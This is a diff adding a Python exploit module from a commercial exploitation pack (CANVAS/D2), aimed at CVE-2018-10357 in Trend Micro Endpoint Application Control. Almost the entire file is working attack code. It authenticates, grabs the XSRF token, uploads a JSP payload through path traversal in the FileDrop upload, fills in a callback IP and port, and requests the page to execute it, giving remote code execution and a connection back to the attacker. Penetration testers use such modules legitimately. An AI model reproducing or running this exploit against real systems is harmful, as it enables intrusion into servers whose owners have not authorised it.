@@ -1,0 +1,141 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+import sys
+import time
+import os
+import random
+import re
+import urllib
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Trend Micro Endpoint Application Control Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in Trend Micro Endpoint Application Control FileDrop"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Trend Micro"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "< 2.0 SP1 CP3"
+DOCUMENTATION["Date public"] = "2018.05.17"
+DOCUMENTATION["References"] = "https://www.zerodayinitiative.com/advisories/ZDI-18-469/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2018-10357"
+DOCUMENTATION["CVE Url"] = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10357"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_tmeac/d2.jsp"    
+    self.protocol = "https"
+    self.port = 4343
+    self.username = ""
+    self.password = ""                    
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):               
+    # Open JSP file
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()
+    
+    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
+    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+
+    # Authentication
+    url = '/acserver/rcs/auth/login'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    params = urllib.urlencode({'username':self.username, 'password':self.password})
+    data = ua.POST(mainurl, params)
+
+    # Get XSRF token
+    xsrf_token = ''
+    if 'XSRF-TOKEN' in ua.cookies:
+        xsrf_token = ua.cookies['XSRF-TOKEN']
+    if xsrf_token == '':
+        self.log("[D2SEC] - XSRF token not found")
+        return 0
+                
+    # Upload JSP file            
+    params = '-----------------880735062871553\r\nContent-Disposition: form-data; name="context"\r\n\r\nimport\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="post"\r\n\r\nd2\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="file"; filename="../../../webapps/tmeac/d2.jsp"\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s\r\n-----------------880735062871553--\r\n'%(len(fdata), fdata)      
+    url = '/acserver/rcs/filedrop?_xsrf-token=%s'%xsrf_token        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    ua.addHeader("Content-Type", "multipart/form-data; boundary=---------------880735062871553") 
+    data = ua.POST(mainurl, params)
+        	
+    # Execute uploaded JSP file
+    url = "/tmeac/d2.jsp"
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)    
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.username = self.argsDict.get("username", self.username)
+    self.password = self.argsDict.get("password", self.password)     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
